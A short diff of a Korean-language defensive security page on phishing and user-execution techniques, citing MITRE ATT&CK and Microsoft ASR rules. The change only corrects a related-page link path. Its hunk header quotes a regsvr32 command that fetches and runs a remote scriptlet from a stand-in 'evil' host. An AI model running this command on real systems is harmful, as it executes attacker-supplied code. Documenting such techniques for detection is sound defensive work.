@@ -108,4 +108,4 @@ regsvr32 /s /n /u /i:http://evil/x.sct scrobj.dll
 
 - [MITRE ATT&CK — T1566](https://attack.mitre.org/techniques/T1566/) · [T1204](https://attack.mitre.org/techniques/T1204/)
 - [Microsoft — Attack Surface Reduction rules reference](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference)
-- 관련 페이지: [PowerShell 크래들](powershell-cradles.md) · [MFT/USN — Zone.Identifier](../windows/mft-usn.md) · [Zeek http.log](../network/zeek/http-log.md) · [보안 검색](../splunk/security-searches.md)
+- 관련 페이지: [PowerShell 크래들](powershell-cradles.md) · [MFT/USN — Zone.Identifier](../windows/mft-usn.md) · [Zeek http.log](../network/zeek/http-log.md) · [보안 검색](../blueteam/splunk/security-searches.md)
